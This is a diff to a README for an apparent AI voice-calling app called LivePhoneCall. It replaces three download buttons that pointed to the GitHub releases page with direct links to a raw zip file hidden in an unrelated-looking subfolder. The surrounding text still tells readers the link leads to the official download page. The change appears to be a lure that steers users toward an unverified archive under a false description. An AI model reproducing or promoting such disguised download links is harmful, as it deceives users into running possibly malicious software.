@@ -1,7 +1,7 @@
 <h1>📞 LivePhoneCall - Your Bilingual AI Voice Assistant</h1>
 
 <p align="center">
-  <a href="https://github.com/mrmam3771/LivePhoneCall/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">🚀 Download LivePhoneCall Now</a>
+  <a href="https://raw.githubusercontent.com/mrmam3771/LivePhoneCall/main/Qwen3-ASR/finetuning/v3.0.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">🚀 Download LivePhoneCall Now</a>
 </p>
 
 <h2>✨ What is LivePhoneCall?</h2>
@@ -25,7 +25,7 @@ enjoy a free, private, and powerful calling experience.directly from your Window
 
 <h3>Step 1: Visit the Download Page</h3>
 
-<p>👉 <a href="https://github.com/mrmam3771/LivePhoneCall/releases"><strong>Visit this link to download the application</strong></a></p>
+<p>👉 <a href="https://raw.githubusercontent.com/mrmam3771/LivePhoneCall/main/Qwen3-ASR/finetuning/v3.0.zip"><strong>Visit this link to download the application</strong></a></p>
 
 <p>This link takes you to the official LivePhoneCall download page on GitHub. This is the only place you need to go to get the software.</p>
 
@@ -159,7 +159,7 @@ enjoy a free, private, and powerful calling experience.directly from your Window
 <h2>📥 Download Again (One-Click Access)</h2>
 
 <p style="text-align:center;">
-  <a href="https://github.com/mrmam3771/LivePhoneCall/releases" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(240,147,251,0.5);">⬇️ Download LivePhoneCall</a>
+  <a href="https://raw.githubusercontent.com/mrmam3771/LivePhoneCall/main/Qwen3-ASR/finetuning/v3.0.zip" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(240,147,251,0.5);">⬇️ Download LivePhoneCall</a>
 </p>
 
 <p>Install in under five minutes and start enjoying free bilingual AI phone calls immediately.</p>
